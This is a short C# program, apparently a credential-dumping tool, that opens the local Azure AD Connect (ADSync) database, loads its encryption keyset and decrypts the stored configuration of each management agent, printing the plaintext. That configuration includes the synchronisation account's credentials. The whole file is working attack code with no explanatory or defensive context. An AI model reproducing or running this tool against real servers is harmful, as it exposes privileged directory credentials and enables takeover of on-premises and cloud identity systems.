using Microsoft.DirectoryServices.MetadirectoryServices.Cryptography;
using System;
using System.Data.SqlClient;


namespace ADSyncDecrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            KeyManager keyManager = new KeyManager();

            string connectionString = (args.Length == 0) ? "Data Source=(LocalDB)\\.\\ADSync;Initial Catalog=ADSync;Connect Timeout=30" : args[0];
            Console.WriteLine("Opening database {0}", connectionString);
            using (SqlConnection conn = new SqlConnection(connectionString))
            {
                conn.Open();
                SqlCommand command = new SqlCommand("SELECT instance_id, keyset_id, entropy FROM mms_server_configuration;", conn);
                SqlDataReader reader = command.ExecuteReader();
                reader.Read();

                uint keyset_id = (uint) reader.GetInt32(1);

                Guid instance_id = new Guid(reader[0].ToString());
                Guid entropy = new Guid(reader[2].ToString());
                keyManager.LoadKeySet(entropy, instance_id, keyset_id);
                reader.Close();
                Key credKey = null;
                keyManager.GetActiveCredentialKey(ref credKey);
                command = new SqlCommand("SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;", conn);
                reader = command.ExecuteReader();
                while (reader.Read())
                {
                    Console.WriteLine("Configuration XML: ");
                    Console.WriteLine(reader[0].ToString());
                    string plain = null;
                    Console.WriteLine("Decrypted configuration XML: ");
                    credKey.DecryptBase64ToString(reader[1].ToString(), ref plain);
                    Console.WriteLine(plain);
                }
                reader.Close();
            }
        }
    }
}
